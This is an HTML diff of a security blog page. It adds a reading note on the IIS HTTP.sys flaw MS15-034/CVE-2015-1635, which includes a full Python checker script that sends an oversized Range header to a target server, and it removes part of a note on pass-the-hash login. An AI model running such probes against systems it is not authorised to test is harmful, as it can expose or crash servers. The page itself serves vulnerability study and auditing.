@@ -249,6 +249,16 @@
           </a>
         </li>
       
+        
+        <li class="menu-item menu-item-tools">
+          <a href="/tools/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wrench"></i> <br />
+            
+            工具集
+          </a>
+        </li>
+      
 
       
     </ul>
@@ -268,6 +278,243 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://tycx2ry.github.io/2015/04/16/073c63c1aa3430f492d13288b7bbbc0d/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="L.N.">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar_1.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="卫星2队">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2015/04/16/073c63c1aa3430f492d13288b7bbbc0d/" itemprop="url">读《MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析》</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-04-16T19:31:15+08:00">
+                2015-04-16
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-02-26T13:59:23+08:00">
+                2018-02-26
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/读书笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">读书笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2015/04/16/073c63c1aa3430f492d13288b7bbbc0d/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2015/04/16/073c63c1aa3430f492d13288b7bbbc0d/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2015/04/16/073c63c1aa3430f492d13288b7bbbc0d/" class="leancloud_visitors" data-flag-title="读《MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析》">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>原文：<a href="http://drops.wooyun.org/papers/5669" target="_blank" rel="noopener">http://drops.wooyun.org/papers/5669</a> <div><br></div><div>修改的测试脚本：</div><div><div><pre class="prettyprint linenums prettyprinted"></pre></div></div></p>
+<ol>
+<li><code>&lt;span class=&quot;com&quot;&gt;# -&amp;#42- coding: utf-8 -&amp;#42-&lt;/span&gt;</code><br>2.3.4.  <code>&lt;span class=&quot;str&quot;&gt;&#39;&#39;&#39;&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;___.                                   .___ __                         __&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;\_ |__   ____ ___.__. ____   ____    __| _//  |________ __ __  _______/  |_&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt; | __ \_/ __ &amp;lt;   |  |/  _ \ /    \  / __ |\   __\_  __ \  |  \/  ___/\   __\&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt; | \_\ \  ___/\___  (  &amp;lt;_&amp;gt; )   |  \/ /_/ | |  |  |  | \/  |  /\___ \  |  |&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt; |___  /\___  &amp;gt; ____|\____/|___|  /\____ | |__|  |__|  |____//____  &amp;gt; |__|&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;     \/     \/\/                \/      \/                        \/&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;                                                            MS15-034 Checker&lt;/span&gt;</code><br>12.13.  <code>&lt;span class=&quot;str&quot;&gt;Danger! This script has not been properly qa&#39;d and will probably fail in terrible ways.&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;It is based off a change in HTTP!UlpParseRange in which an error code is returned as a&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;result of a call to HTTP!RtlULongLongAdd when evaluating the upper and lower range of&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;an HTTP range request.&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;-BF&lt;/span&gt;</code><br>18.19.20.  <code>&lt;span class=&quot;str&quot;&gt;8a8b2112 56              push    esi&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;8a8b2113 6a00            push    0&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;8a8b2115 2bc7            sub     eax,edi&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;8a8b2117 6a01            push    1&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;8a8b2119 1bca            sbb     ecx,edx&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;8a8b211b 51              push    ecx&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;8a8b211c 50              push    eax&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;str&quot;&gt;8a8b211d e8bf69fbff      call    HTTP!RtlULongLongAdd (8a868ae1) ; here&lt;/span&gt;</code><br>28.29.  <code>&lt;span class=&quot;str&quot;&gt;&#39;&#39;&#39;&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; socket&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; random&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;kwd&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;</code><br>33.34.  <code>&lt;span class=&quot;pln&quot;&gt;hexAllFfff &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;18446744073709551615&quot;&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;lower &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;0&quot;&lt;/span&gt;</code><br>36.37.  <code>&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; len&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;[-] please input IP, python &#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39; 127.0.0.1 80 0&#39;&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;    sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;</code><br>40.41.  <code>&lt;span class=&quot;pln&quot;&gt;ipAddr &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;ipPort &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; int&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;req1 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;GET / HTTP/1.0\r\n\r\n&quot;&lt;/span&gt;</code><br>44.45.46.  <code>&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[&amp;#42] Audit Started&quot;&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;client_socket &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;ipAddr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; ipPort&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;))&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;req1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;boringResp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;com&quot;&gt;#print boringResp&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;pattern &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;compile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;Length:\s+\d+&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;findall &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; pattern&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;boringResp&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; findall&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;    contentlength &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; int&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; int&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;        lower &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; contentlength&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[-] content-length fail!!&quot;&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Microsoft&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; boringResp&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[&amp;#42] Not IIS&quot;&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;    exit&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;</code><br>64.65.  <code>&lt;span class=&quot;pln&quot;&gt;req &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;-&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; \&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;    hexAllFfff &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\r\n\r\n&quot;&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[-] \n&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;req&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;client_socket &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;ipAddr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; ipPort&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;))&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;goodResp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;com&quot;&gt;#print goodResp&lt;/span&gt;</code><br>73.74.  <code>&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Requested Range Not Satisfiable&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; goodResp&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[!!] Looks VULN&quot;&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;kwd&quot;&gt;elif&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot; The request has an invalid header name&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; goodResp&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[&amp;#42] Looks Patched&quot;&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code></li>
+<li><code>&lt;span class=&quot;pln&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[&amp;#42] Unexpected response, cannot discern patch status&quot;&lt;/span&gt;</code></li></ol>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2015/04/16/073c63c1aa3430f492d13288b7bbbc0d/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -994,190 +1241,6 @@ alert(a);
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://tycx2ry.github.io/2015/03/30/006bdbdbef35aa1e6bf2b3245c973c5a/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="L.N.">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar_1.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="卫星2队">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2015/03/30/006bdbdbef35aa1e6bf2b3245c973c5a/" itemprop="url">读《使用Hash直接登录Windows》</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-03-30T19:25:26+08:00">
-                2015-03-30
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">更新于&#58;</span>
-              
-              <time title="更新于" itemprop="dateModified" datetime="2018-02-26T13:59:22+08:00">
-                2018-02-26
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/读书笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">读书笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2015/03/30/006bdbdbef35aa1e6bf2b3245c973c5a/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2015/03/30/006bdbdbef35aa1e6bf2b3245c973c5a/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2015/03/30/006bdbdbef35aa1e6bf2b3245c973c5a/" class="leancloud_visitors" data-flag-title="读《使用Hash直接登录Windows》">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
